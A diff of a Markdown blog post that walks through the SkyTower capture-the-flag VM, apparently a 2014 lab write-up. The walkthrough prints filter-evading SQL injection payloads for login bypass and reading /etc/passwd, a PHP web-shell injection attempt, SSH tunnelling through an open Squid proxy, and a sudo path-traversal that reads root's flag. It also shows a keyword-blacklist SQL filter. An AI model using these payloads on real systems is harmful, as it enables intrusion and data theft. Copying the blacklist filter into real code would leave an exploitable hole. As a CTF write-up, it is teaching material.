@@ -7,10 +7,9 @@ categories:
 comments: true
 date: 2014-07-17T18:20:12Z
 title: Climbing the SkyTower
-url: /2014/07/17/climbing-the-skytower/
 ---
 
-##foreword
+## foreword
 Recently, at a local Security Conference, [@telspacesystems](https://twitter.com/telspacesystems) ran a CTF. It was a classic 'read /root/flag.txt' CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on [VulnHub](http://vulnhub.com/entry/skytower-1,96/), and was promptly downloaded and loaded into VirtualBox.
 
 In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)
@@ -22,7 +21,7 @@ The very first thing to do was get the IP assigned by my home router to the VM. 
 
 The home page presented you with a login screen and a 2.5MB 'background.jpg' image. Right in the beginning I was started off on the wrong path. I downloaded this background image and attempted to see if there was anything particularly interesting about it. Sadly, the answer to this question was a loud *NOPE*. I started dirbuster on the web interface and proceeded with a nmap scan of 192.168.137.242 after which I had to call it a night.
 
-```bash SkyTower Nmap results
+```bash
 $ nmap --reason -Pn 192.168.137.242
 
 Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-17 18:32 SAST
@@ -41,7 +40,7 @@ Next morning I reviewed the results and continued to poke around.
 ## learn all you can
 With the information gathered so far, I realized that the SSH (tcp/22) was explicitly filtered, however the squid proxy was open. I tried to telnet and use the CONNECT method to see if I was able to access the SSH service:
 
-```bash SSH Access via open proxy
+```bash
 $ telnet 192.168.137.242 3128
 Trying 192.168.137.242...
 Connected to 192.168.137.242.
@@ -61,13 +60,13 @@ The next step was to poke around the web application. I personally really enjoy 
 
 A natural reaction is to try and use a single quote in form fields as a quick and nasty check for potential SQL injection. A login attempt with a username of test and password `'` resulted in:
 
-```bash SQLi Reveal
+```bash
 There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1]
 ```
 
 Classic SQLi! Surprised I continued with simple login bypasses. None that I could think of out of my head appeared to work. Eventually I started to notice that some of the keywords that I was using were not appearing in the error messages. This hinted heavily towards the fact that there may be some form of filtering in place. Eventually, I put the request down in a curl command so that I can work with this slightly easier. To sample the keywords being removed:
 
-```bash SkyTower keyword removal
+```bash
 $ curl --data "email=foo@bar&password=' OR 1=1#" http://192.168.137.242/login.php
 There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11#'' at line 1]%
 
@@ -77,7 +76,7 @@ There was an error running the query [You have an error in your SQL syntax; chec
 
 Ok, so no `OR`. Thats ok, we can substitute this easily with `||`.
 
-```html SkyTower Auth Bypass
+```html
 $ curl --data "email=foo@bar&password=' || 1=1#" http://192.168.137.242/login.php
 <HTML>
       <div style="height:100%; width:100%;background-image:url('background.jpg');
@@ -110,7 +109,7 @@ And success. We have made some progress :D Little did I know that I don't actual
 From the auth bypass results, we can see specific mention for users to SSH into the server. This particular user has a username `john` and a password `hereisjohn`. So lets try this.
 I setup my `proxychains` install to use the http proxy available on the server (`http 192.168.137.242 3128`) and opened a SSH session through it:
 
-```bash SSH via Squid Proxy
+```bash
 $ proxychains4 ssh john@127.0.0.1
 [snip]
 [proxychains] Strict chain  ...  192.168.137.242:3128  ...  127.0.0.1:22  ...  OK
@@ -135,14 +134,14 @@ $
 ## more sql injection
 So back to the SQLi point it was. Taking a wild guess, I assumed there is a `users` table, and the table will have a primary key of `id`. So, `john` may have id 1, and a next user have id 2. So I modified the query slightly:
 
-```bash SkyTower = filter
+```bash
 $ curl --data "email=foo@bar&password=' || id=1#" http://192.168.137.242/login.php
 There was an error running the query [Unknown column 'id1' in 'where clause']%
 ```
 
 Well I definitely didn't ask for the column `id1`, but from this again it was apparent that `=` was filtered along with `OR`. :| Ok, so we change the payload again:
 
-```bash SkyTower user enum
+```bash
 $ curl --data "email=foo@bar&password=' || id > 1#" http://192.168.137.242/login.php
 [snip]
 <br><strong><font size=4>Welcome sara@skytech.com</font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: sara</strong><br><strong>Password: ihatethisjob</strong> <br><br> We wish you the best of luck in your future endeavors. <br> </div> </div></HTML>%
@@ -165,7 +164,7 @@ I studied the error messages in detail, googled... a lot... and eventually came 
 
 For the sake of brevity I am not going to detail all of the methods I used in order to exploit the SQLi and get value out of it. I managed to learn that the database user used by the PHP application was root. The query used in `login.php` returned 3 columns. One particular payload of interest that uses the method in the previously mentioned blog post, was used to start reading files from the servers disk. More specifically, `/etc/passwd`:
 
-```bash SkyTower File Access
+```bash
 $ curl --data "email=foo@bar&password=' or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt load_file('/etc/password')) as c#" http://192.168.137.242/login.php
 [snip]
 <br><strong><font size=4>Welcome 222</font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: 222</strong><br><strong>Password: root:x:0:0:root:/root:/bin/bash
@@ -197,7 +196,7 @@ william:x:1002:1002:,,,:/home/william:/bin/bash
 
 Reading the `/etc/passwd` revealed that there were no custom shells used for the users that were enumerated previously. O..k.. I also pulled the sources of `login.php` in order to understand what the deal with the filtering was:
 
-```php SkyTower SQL Injection Filtering
+```php
 $sqlinjection = array("SELECT", "TRUE", "FALSE", "--","OR", "=", ",", "AND", "NOT");
 $email = str_ireplace($sqlinjection, "", $_POST['email']);
 $password = str_ireplace($sqlinjection, "", $_POST['password']);
@@ -207,7 +206,7 @@ And as suspected. :)
 
 One last thing that I tried, really hard, was to get a web shell on the server so that I can further explore the environment. This failed miserably. The closest I was able to get was:
 
-```bash SkyTower webshell fail
+```bash
 $ curl --data "email=foo@bar&password=' or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt '<?php print_r(shell_exec($_GET[cmd])); ?>') as c into outfile '/var/www/shell.php'#" http://192.168.137.242/login.php
 There was an error running the query [Can't create/write to file '/var/www/shell.php' (Errcode: 13)]
 ```
@@ -220,7 +219,7 @@ After spending a really long time with the SQL injections, I decided to relook t
 
 For this case though, I though I'd specify a `/bin/sh` as the _command_ to run, hoping to not get caught in a `.bashrc` running:
 
-```bash SkyTower .bashrc fix
+```bash
 $ proxychains4 -q ssh john@127.0.0.1 -t /bin/sh
 john@127.0.0.1's password:
 $ id
@@ -229,7 +228,7 @@ uid=1000(john) gid=1000(john) groups=1000(john)
 
 Woop! I was now logged in as `john`. I inspected the `.bashrc` file and saw that at the end there was:
 
-```bash SkyTower .bashrc exit
+```bash
 echo
 echo  "Funds have been withdrawn"
 exit
@@ -240,7 +239,7 @@ exit
 ## enumeration enumeration enumeration
 I enumerated, everything... Referring to a excellent [post by g0tm1lk](http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) nothing aparent came up. The only semi strange thing was a empty `/accounts/` directory:
 
-```bash SkyTower accounts
+```bash
 john@SkyTower:/accounts$ ls -lah /accounts/
 total 8.0K
 drwxr-xr-x  2 root root 4.0K Jun 20 07:52 .
@@ -249,7 +248,7 @@ drwxr-xr-x 24 root root 4.0K Jun 20 07:52 ..
 
 Other than that things seemed pretty normal. I decided to check out the other user `sara` too. This user has a similar `exit` in the `.bashrc` which I just removed. There was one distinct difference during enumeration though...
 
-```bash sara sudo
+```bash
 sara@SkyTower:~$ sudo -l
 Matching Defaults entries for sara on this host:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -264,7 +263,7 @@ This user may execute some commands as root using `sudo`. `sudo` allows you to s
 
 So, to complete SkyTower:
 
-```bash SkyTower pwn
+```bash
 sara@SkyTower:~$ sudo cat /accounts/../../root/flag.txt
 Congratz, have a cold one to celebrate!
 root password is theskytower
